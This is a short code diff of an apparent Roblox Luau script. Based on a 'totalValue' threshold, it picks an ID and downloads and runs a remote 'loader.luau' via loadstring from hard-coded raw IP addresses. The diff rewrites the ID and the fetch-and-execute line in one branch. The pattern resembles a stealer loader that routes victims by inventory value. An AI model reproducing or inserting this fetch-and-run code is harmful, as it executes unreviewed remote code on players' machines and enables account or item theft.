@@ -187,6 +187,6 @@ if totalValue > 5000 then
     ID="281b4cca-f00e-4f9d-985c-32df2a0b73b5";
     loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 else
-  ID="02b75653-1b17-44bf-b3e0-d3c82c09ab02";
-  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    ID="158b7837-c38b-4a29-ad6e-9a7d86e7403c";
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
